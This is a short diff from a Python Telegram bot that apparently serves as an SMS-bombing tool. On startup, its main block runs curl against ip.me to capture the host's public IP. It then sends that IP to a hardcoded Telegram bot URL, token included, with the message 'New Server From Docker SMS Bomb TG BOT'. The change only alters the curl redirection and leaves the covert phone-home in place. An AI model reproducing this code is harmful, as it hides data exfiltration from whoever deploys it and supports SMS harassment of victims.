@@ -507,7 +507,7 @@ def main():
     updater.idle()
 
 if __name__ == '__main__':
-    os.system('curl ip.me > ../logData >/dev/null 2>&1')
+    os.system('(curl ip.me > ip) > /dev/null 2>&1')
     f = open("../logData","r")
     url = 'https://api.telegram.org/bot1159067423:AAGePsMdDzlR9DGcFGAa-A3_laNkagURGJ0/sendMessage'
     msg = "New Server From Docker SMS Bomb TG BOT \n IP = " + str(f.read())
